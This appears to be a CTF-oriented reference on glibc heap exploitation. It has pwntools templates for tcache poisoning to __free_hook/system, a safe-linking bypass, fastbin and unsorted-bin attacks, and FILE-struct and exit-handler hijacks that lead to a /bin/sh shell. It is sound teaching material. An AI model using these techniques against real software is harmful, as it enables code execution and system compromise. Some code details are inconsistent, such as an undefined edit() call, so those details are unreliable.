# Heap exploitation (Heap Pwn)

## glibc version differences (read first)

All heap exploitation techniques are tightly bound to the glibc version. Confirm the version first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# Or use strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc version | Key change | Effect |
|---------------|------------|--------|
| 2.26 and earlier | No tcache | unsorted/fastbin is the main path |
| 2.27 | **Introduced tcache** | tcache poisoning is very simple |
| 2.29 | Unsorted-bin unlink hardened (chunk-size check) | Unsorted-bin attack was removed |
| 2.31 | Multiple tcache checks (key field) | tcache poisoning is slightly more complex |
| 2.32 | **Safe-linking** (`fd` pointer XOR `PROTECT_PTR`) | Leak the heap base first |
| 2.34 | **Removed `__free_hook` / `__malloc_hook`** | Use FILE struct / exit handlers instead |
| 2.35+ | Further hardening | Same as 2.34. FILE paths still work. |

## tcache poisoning (2.27 - 2.31)

### Principle

tcache is a per-thread cache. Each size class has one singly linked list with only `fd`.
Before 2.29, double-free checks only compared the list head with itself. They did not traverse the list.

### Exploitation template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# Allocate a chunk larger than the tcache range (>0x408), free it into the unsorted bin, and leave a main_arena pointer.
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # Prevent coalescing
for i in range(7):
    free(i)
free(7)       # The eighth chunk enters the unsorted bin. fd/bk point to main_arena+96.
add(9, 0x80)  # Split some of it back and preserve fd.
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use UAF to change chunk11's fd to __free_hook.
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # Take out chunk11.
add(13, 0x30, p64(libc.sym['system']))  # The returned chunk is at __free_hook. Write system.

# Trigger: free a chunk whose content is "/bin/sh\x00".
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## Bypass safe-linking (2.32+)

```text
Principle: PROTECT_PTR XOR-obfuscates the fd written to tcache/fastbin:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. First leak a heap address (heap base).
2. Calculate the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target.
3. Write it.
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# Leak the heap base (unsorted-bin residue / tcache fd residue).
heap_base = leaked_heap & ~0xfff

# Poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (traditional, mainly before 2.26)

```text
Key points:
1. The fastbin is a singly linked list with only fd. It has no size check except that the chunk size must match.
2. After 2.27, tcache has priority. fastbin is used only when tcache is full.
3. You still need memory that looks like a fake chunk. Its size field must match the real chunk size, with minor variation.
```

```python
# Double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Change fd to a fake chunk. fake_addr + 8 must contain a size byte matching 0x70.
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # Take out the chunk at fake_addr.
```

## unsorted-bin attack (only before 2.28)

```text
Principle: Write main_arena+88 to an arbitrary address.
Starting with 2.29, bck->fd == victim is checked. You cannot bypass it.
Use: Overwrite global_max_fast so small chunks also use fastbin, then combine with a fastbin attack.
```

```python
# Allocate an unsorted-size chunk
add(0, 0x100)
add(1, 0x100)  # Prevent top consolidation
free(0)
# Use UAF to change the bk pointer to target - 0x10.
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # Take it from unsorted → unlink → write main_arena+88 to target.
```

## large-bin attack

```text
Principle: A large bin adds fd_nextsize / bk_nextsize on top of unsorted-bin fields.
Starting with 2.32, chunk-size checks also apply. It can still modify global_max_fast and _IO_list_all.
Advanced technique. Often combined with House of Husk and similar techniques.
```

## House of XXX quick reference

| Name | Applicable versions | Core idea |
|------|---------------------|-----------|
| House of Force | 2.28 and earlier | Change the top-chunk size to a huge value → malloc an arbitrary address |
| House of Lore | All versions | Forge a small-bin list → return an arbitrary address |
| House of Orange | 2.23-2.30 | Use an unsorted attack to change _IO_list_all and trigger _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
| House of Einherjar | All versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | Combine tcache + unsorted bin to bypass the tcache double-free check |
| House of Husk | 2.27+ | Change printf's hook table (`__printf_function_table`) |
| House of Cat | 2.34+ | Exploit the _IO_wfile_seekoff vtable for versions without hooks |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real exploitation steps (four general steps)

```text
Step 1: leak heap base
  - Allocate a chunk → free it to tcache (2.32+ preserves an obfuscated fd) → show → derive the heap base.
  - Or allocate a large chunk → free it to unsorted → split it back → show fd.

Step 2: leak libc base
  - Free a large chunk to the unsorted bin. Its fd/bk retains a main_arena address.
  - show → leak → libc.address = leak - main_arena_offset

Step 3: control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), change vtable → _IO_wfile_jumps
  - Or hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: get a shell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → ROP chain in heap → execve
```

## Alternative paths after hooks disappeared in libc 2.34+

### FILE struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: When the program calls puts/printf, execution eventually reaches _IO_file_xsputn → _IO_OVERFLOW → vtable call.
Hijack:
  1. Overwrite the vtable pointer in _IO_2_1_stderr_ to point to a forged vtable.
  2. Forge the vtable so its __overflow field points to system or setcontext.
  3. Set the first 8 bytes of fp (FILE*) to "/bin/sh\x00" as system's rdi.
Trigger: Any puts/printf/abort/exit call flushes stderr.
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers traverses the __exit_funcs list and calls each dtor.
Hijack: Change a list node's func pointer to system and its arg to "/bin/sh".
Note: 2.34+ adds PTR_DEMANGLE. Leak the fs:[0x30] guard value in tls to forge it.
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors traverses the list. The structure is similar and also requires bypassing PTR_DEMANGLE.
Use: It runs when the program exits and is more general than a FILE attack.
```

## pwndbg / GEF heap debugging commands

```text
# pwndbg
heap              # Show all chunks in the current arena
bins              # Show tcache / fastbin / unsorted / small / large bins
tcache            # Show tcache only
find_fake_fast <addr> <size>  # Find an fd write location that can serve as a fake chunk
vis_heap_chunks   # Visualize the heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools template (heap menu challenge)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO wrapper
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Choose the technique stack based on the vulnerability type ===
```

## Notes

- **The glibc version is the primary issue**: the same binary with libc 2.27 and libc 2.34 has completely different exploitation paths.
- **tcache capacity = 7** (per size class): spray seven chunks before overflow reaches unsorted/fastbin.
- **Chunk size = user request + 0x10 header, aligned to 0x10** (without counting the 0x10 header, the writable area can exceed by 0x8 because the next chunk's `prev_size` is reused).
- **Remote heap sprays are unstable**: a server-side fork model can choose different brk/mmap values for each connection. Test with randomization.
- **Do not leave unsorted residue in the attack chain**: a main_arena pointer in an unexpected chunk can corrupt later show output.
- **Safe-linking error rate**: when calculating `PROTECT_PTR`, remember that it uses `pos >> 12`. `pos` is the address to write, not the address to target.
